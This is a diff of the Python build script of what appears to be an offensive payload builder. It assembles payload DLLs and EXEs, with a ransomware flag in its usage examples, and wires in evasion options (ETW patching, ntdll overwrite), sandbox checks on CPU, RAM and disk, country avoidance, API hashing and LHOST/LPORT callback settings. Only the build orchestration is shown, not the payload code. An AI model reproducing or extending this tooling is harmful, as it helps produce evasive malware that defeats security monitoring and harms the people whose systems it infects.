@@ -1,120 +1,22 @@
 #!/usr/bin/env python3
 from configparser import ConfigParser
-import argparse
+import sys
 import os
 from core.encryptor import Encryptor
 from core.templator import Templator
 from core.configator import check_config_and_merge
-from core.utils import round_pow2
+from core.utils import get_LCID, round_pow2, format_instructions, hash_obj
 from core.orchestrator import prepare_build_env, build_dll, build_exe
+from core.hasher import *
+from core.argparsor import parse_args, get_selected_payload
 
 PAYLOAD_DIR = "src/dll/payloads"
 WORKING_FOLDER = "build/"
 
-config = ConfigParser()
-config.read(".conf")
-
-# Custom formatter: show defaults normally, but DO NOT append "(default: ...)"
-# for arguments whose dest starts with "payload_" or which are evasions.
-class _Fmt(argparse.ArgumentDefaultsHelpFormatter, argparse.RawDescriptionHelpFormatter):
-    # Add here any dest names for which we don't want the "(default: ...)" suffix
-    _no_default_dests = {"etw", "ntdll"}
-
-    def _get_help_string(self, action):
-        dest = getattr(action, "dest", "")
-        # Hide defaults for dynamic payload flags (dest starts with payload_)
-        # and for explicit evasions listed in _no_default_dests.
-        if dest.startswith("payload_") or dest in self._no_default_dests:
-            return action.help
-        return argparse.ArgumentDefaultsHelpFormatter._get_help_string(self, action)
-
-
-EPILOG = """Examples:
-  build.py -o evil.exe --ransom --etw -v
-  build.py --small -o demo.exe --debug
-  build.py --help
-"""
-
-DESCRIPTION = """Usage:
-  build.py [options] --<payload>
-"""
-
-def _discover_payloads(payload_dir: str):
-    names = []
-    if os.path.isdir(payload_dir):
-        for f in sorted(os.listdir(payload_dir)):
-            if f.endswith(".c"):
-                names.append(f[:-2])
-    return names
-
-def get_selected_payload(args):
-    payload = None
-    for name in _discover_payloads(PAYLOAD_DIR):
-        if getattr(args, f"payload_{name}", False):
-            payload = name
-            break
-    assert payload is not None  # devrait être garanti par parse_args()
-    return payload
-
-def parse_args(argv=None):
-    # We disable the automatic -h so we can add it inside our "Options" group.
-    parser = argparse.ArgumentParser(
-        description=DESCRIPTION,
-        epilog=EPILOG,
-        formatter_class=_Fmt,
-        add_help=False,
-    )
-
-    # ----- Options (group) -----
-    opt = parser.add_argument_group("Options")
-    # Manually add help so it appears under the "Options" header
-    opt.add_argument("-h", "--help", action="help", help="show this help message and exit")
-    opt.add_argument("-o", "--output", type=str, default="executable.exe",
-                     help="Output file name")
-    opt.add_argument("-s", "--small", action="store_true",
-                     help="Prioritize size over other factors")
-    opt.add_argument("-v", "--verbose", action="store_true",
-                     help="Enable verbose mode")
-
-    # ----- Payloads (group + mutually exclusive) -----
-    payload_group = parser.add_argument_group(
-        "Payload",
-        "Exactly one payload must be specified. "
-        f"Payload flags map to {PAYLOAD_DIR}/<name>.c"
-    )
-    mex = payload_group.add_mutually_exclusive_group(required=False)
-
-    payload_names = _discover_payloads(PAYLOAD_DIR)
-    for name in payload_names:
-        # dest names start with "payload_" so our custom formatter can detect them
-        mex.add_argument(f"--{name}", dest=f"payload_{name}",
-                         action="store_true", help=f"Use payload '{name}'")
-
-
-    # ----- Evasions (separate group) -----
-    evasions = parser.add_argument_group("Evasions")
-    evasions.add_argument("--etw", action="store_true", help="Disable ETW")
-    evasions.add_argument("--ntdll", action="store_true", help="Overwrite ntdll from disk")
-
-
-    # You previously used a "command" idea; keep it if you need commands later.
-    # For now we keep no subcommands, so just parse.
-    args = parser.parse_args(argv)
-
-    # ----- Validation: require exactly one payload -----
-    selected = [k for k, v in vars(args).items() if k.startswith("payload_") and v]
-    if len(selected) != 1:
-        if payload_names:
-            choices = ", ".join(f"--{n}" for n in payload_names)
-            parser.error(f"Exactly one payload must be specified. Available: {choices}")
-        else:
-            parser.error(f"No payloads found in {PAYLOAD_DIR}")
-
-    args.payload_name = selected[0][8:]  # drop "payload_" prefix
-
-    return args
-
 def main():
+    config = ConfigParser()
+    config.read(".conf")
+
     args = parse_args()
     print(args) if args.verbose else None
 
@@ -143,20 +45,96 @@ def main():
 
 
     # Step 1: Replace templates in payload file
-    dll_templator = Templator(working_folder="build/dll/", templates_folder="src/templates/", verbose=args.verbose)
+    step1_templator = Templator(working_folder="build/", templates_folder="src/templates/", verbose=args.verbose)
     # replace all patterns execpt list of exceptions
-    tags_by_file = dll_templator.extract_tags_from_folder("build/dll/")
-    tags_by_file += dll_templator.extract_tags_from_folder("build/common/")
+    tags_by_file = step1_templator.extract_tags_from_folder()
+    print("[i] Tags found in files:") if args.verbose else None
     print(tags_by_file) if args.verbose else None
-    dll_templator.replace_tags(tags_by_file)
+    # dll_templator.replace_tags(tags_by_file)
 
-    if args.etw:
-        dll_templator.sed_files("%__ETW_PATCHING__%", "patch_etw();")
-    else: 
-        dll_templator.sed_files("%__ETW_PATCHING__%", "// ETW patching not enabled")
+    not_replaced_tags = []
 
+    for file in tags_by_file:
+        print(file)
+        filepath = file["filepath"]
+        tags = file["tags"]
+        print(f"Processing file: {filepath} with tags: {tags}") if args.verbose else None
+        for tag in tags:
+            print(f"Processing tag: {tag['raw']} (type: {tag['type']}, name: {tag['name']}") if args.verbose else None
+            if tag['replaced']:
+                continue
+            elif tag['type'] == "MODHASH":
+                step1_templator.sed_file(filepath, tag['raw'], hash_obj(tag['name'], "", args.verbose))
+            elif tag['type'] == "FCTHASH":
+                step1_templator.sed_file(filepath, tag['raw'], hash_obj(tag['name'], "function", args.verbose))
+
+            elif tag['type'] == "SANDBOX":
+                if tag['name'] == "CPU_CHECK":
+                    if config.getint("Anti-Analysis", "cpu_cores"):
+                        check_content = step1_templator.get_template(tag['name'], str(config.getint("Anti-Analysis", "cpu_cores")))
+                        step1_templator.sed_file(filepath, tag['raw'], check_content)
+                    else:
+                        print("No CPU core count for Sandbox detection set in config file. Skipping CPU check.") if args.verbose else None
+                        step1_templator.sed_file(filepath, tag['raw'], '/* No CPU check configured */')
+
+                elif tag['name'] == "RAM_CHECK":
+                    if config.getint("Anti-Analysis", "ram_size"):
+                        check_content = step1_templator.get_template(tag['name'], str(config.getint("Anti-Analysis", "ram_size")))
+                        step1_templator.sed_file(filepath, tag['raw'], check_content)
+                    else:
+                        print("No RAM size for Sandbox detection set in config file. Skipping RAM check.") if args.verbose else None
+                        step1_templator.sed_file(filepath, tag['raw'], '/* No RAM check configured */')
+
+                elif tag['name'] == "DISK_CHECK":
+                    if config.getint("Anti-Analysis", "disk_size"):
+                        check_content = step1_templator.get_template(tag['name'], str(config.getint("Anti-Analysis", "disk_size")))
+                        step1_templator.sed_file(filepath, tag['raw'], check_content)
+                    else:
+                        print("No Disk size for Sandbox detection set in config file. Skipping Disk check.") if args.verbose else None
+                        step1_templator.sed_file(filepath, tag['raw'], '/* No Disk check configured */')
+
+                elif tag['name'] == "COUNTRY_CHECK":
+                    if config.get("Anti-Analysis", "avoid_countries"):
+                        check_content = step1_templator.get_template(tag['name'])
+                        step1_templator.sed_file(filepath, tag['raw'], check_content)
+                    else:
+                        step1_templator.sed_file(filepath, tag['raw'], '// Country check not enabled')
+
+                elif tag['name'] == "AVOID_COUNTRIES":
+                    if config.get("Anti-Analysis", "avoid_countries"):
+                        countries = config.get("Anti-Analysis", "avoid_countries").split(",")
+                        countries_lcid = [str(get_LCID(country.strip())) for country in countries if country.strip()]
+                        step1_templator.sed_file(filepath, tag['raw'], "{" + ", ".join(countries_lcid) + "}")
+                    else:
+                        step1_templator.sed_file(filepath, tag['raw'], "/* No countries to avoid configured */")
+
+            elif tag['type'] == "EVASION":
+                if tag['name'] == "ETW_PATCHING":
+                    if args.etw:
+                        step1_templator.sed_file(filepath, tag['raw'], "patch_etw();")
+                    else:
+                        step1_templator.sed_file(filepath, tag['raw'], "// ETW patching not enabled")
+
+            elif not tag['type']:
+                if tag['name'] == "LHOST":
+                    if config.get("Payload", "lhost"):
+                        step1_templator.sed_file(filepath, tag['raw'], '"' + config.get("Payload", "lhost") + '"')
+                    else:
+                        raise ValueError("LHOST is not set in the configuration (.conf) file.")
+                elif tag['name'] == "LPORT":
+                    if config.get("Payload", "lport"):
+                        step1_templator.sed_file(filepath, tag['raw'], config.get("Payload", "lport"))
+                    else:
+                        raise ValueError("LPORT is not set in the configuration (.conf) file.")
+            else:
+                not_replaced_tags.append(tag)
+
+    if not_replaced_tags:
+        print("[i] Tags not replaced (may be normal if no config value provided):") if args.verbose else None
+        print(not_replaced_tags) if args.verbose else None
+        print(f"Total tags not replaced: {len(not_replaced_tags)}") if args.verbose else None
+        sys.exit(0)  # TODO remove me when done testing
     build_dll(payload, verbose=args.verbose)  # bash scripts/compile_dll.sh payload
-    exit(0)  # TODO remove me when done testing
 
 
     # Step 2: Encrypt payload
